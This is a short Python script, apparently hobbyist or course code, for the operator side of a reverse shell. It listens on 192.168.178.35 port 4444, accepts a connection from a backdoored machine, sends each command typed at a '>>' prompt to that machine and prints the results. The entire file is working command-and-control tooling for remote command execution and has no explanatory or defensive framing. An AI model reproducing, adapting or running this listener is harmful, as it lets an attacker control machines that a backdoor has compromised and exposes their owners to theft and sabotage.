#!/usr/bin/env python
import socket
class Listener:
	def __init__(self, ip ,port):
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		listener.bind((ip,port))
		listener.listen(0)
		print("[+] Waiting for incoming connections")
		self.connection,address = listener.accept()
		print("[+] Got a connetion" + str(address))
	def execute_remotely(self, command):
		self.connection.send(command.encode())
		return self.connection.recv(1024).decode()
	def run(self):
		while True:
			command = input(">> ")
			result = self.execute_remotely(command)
			print(result)
my_listener = Listener("192.168.178.35",4444)
my_listener.run()
